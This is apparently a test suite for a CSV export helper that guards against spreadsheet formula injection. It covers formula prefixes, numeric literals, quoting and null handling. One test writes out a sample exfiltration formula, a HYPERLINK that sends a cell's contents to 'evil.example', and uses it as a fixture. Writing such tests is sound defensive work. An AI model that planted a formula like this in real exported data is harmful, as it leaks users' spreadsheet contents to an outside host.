import { csvCell, toCsv } from './csv';

describe('csvCell', () => {
  it.each([
    ['=1+1', "'=1+1"],
    ['+SUM(A1)', "'+SUM(A1)"],
    ['-2+3', "'-2+3"],
    ['@import', "'@import"],
    ['\tlead', "'\tlead"],
    ['\rlead', "'\rlead"],
  ])('neutralises %s', (input, expected) => {
    // Excel / Sheets / Numbers execute cells starting with these.
    expect(csvCell(input)).toBe(expected);
  });

  it('neutralises the classic exfiltration payload', () => {
    const attack = '=HYPERLINK("http://evil.example?x="&A1,"click")';
    const out = csvCell(attack);
    expect(out.startsWith("'") || out.startsWith('"\'')).toBe(true);
    expect(out).not.toMatch(/^=/);
  });

  it.each([
    ['-15.000', '-15.000'],
    ['-5', '-5'],
    ['+3.5', '+3.5'],
    ['-1.2e3', '-1.2e3'],
    ['.5', '.5'],
  ])('leaves the numeric literal %s alone so the column still sums', (input, expected) => {
    // Quoting these ships them as text and an accountant cannot total them.
    expect(csvCell(input)).toBe(expected);
  });

  it.each([
    ['-2+3', "'-2+3"],
    ['-cmd', "'-cmd"],
    ['+SUM(A1)', "'+SUM(A1)"],
    ['-1 and more', "'-1 and more"],
  ])('still neutralises %s, which is not a number', (input, expected) => {
    expect(csvCell(input)).toBe(expected);
  });

  it.each([
    ['plain', 'plain'],
    ['has,comma', '"has,comma"'],
    ['has"quote', '"has""quote"'],
    ['has\nnewline', '"has\nnewline"'],
  ])('quotes %s correctly', (input, expected) => {
    expect(csvCell(input)).toBe(expected);
  });

  it.each([
    [null, ''],
    [undefined, ''],
    [0, '0'],
    [false, 'false'],
  ])('renders %s as %s', (input, expected) => {
    expect(csvCell(input)).toBe(expected);
  });

  it('quotes a neutralised cell that also needs escaping', () => {
    expect(csvCell('=a,b')).toBe('"\'=a,b"');
  });
});

describe('toCsv', () => {
  it('emits a header and trailing newline', () => {
    expect(toCsv(['a', 'b'], [[1, 2]])).toBe('a,b\n1,2\n');
  });

  it('runs every cell through the guard', () => {
    expect(toCsv(['x'], [['=evil()']])).toBe("x\n'=evil()\n");
  });
});
